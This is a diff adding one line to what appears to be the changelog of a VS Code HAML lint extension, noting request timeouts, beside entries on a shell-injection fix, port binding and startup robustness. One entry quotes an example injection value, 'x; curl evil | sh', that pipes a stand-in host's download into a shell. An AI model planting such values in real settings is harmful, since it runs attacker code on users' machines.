@@ -7,6 +7,7 @@
 - **Security**: The `haml-lint` and Rails executable checks no longer run through a shell, so a value like `x; curl evil | sh` in the `hamlAll.linterExecutablePath` / `railsRoutes.railsCommand` settings can no longer inject shell commands. These two settings are now machine-scoped (they can only be set in your user settings, not by a workspace's `.vscode/settings.json`), and the extension declares limited support for untrusted workspaces so it stays in Restricted Mode until you trust the folder.
 - **Fix**: The linting server now selects its port by binding directly (retrying on conflict) instead of shelling out to `lsof`, which is unavailable on Windows and could prevent the server from starting.
 - **Fix**: Made linting-server startup more robust. A missing `ruby` executable now surfaces a clear error instead of crashing the extension host; benign Ruby/Bundler warnings on stderr no longer make startup fail with "Failed to start HAML Lint server"; and the start-up handshake is parsed from complete output lines so it no longer times out when the output arrives in chunks.
+- **Fix**: Requests to the linting server now have a timeout and always release their socket, so a linting server that stops responding can no longer hang linting/formatting or leak connections.
 
 ## [3.0.0] - 2026-07-04
 
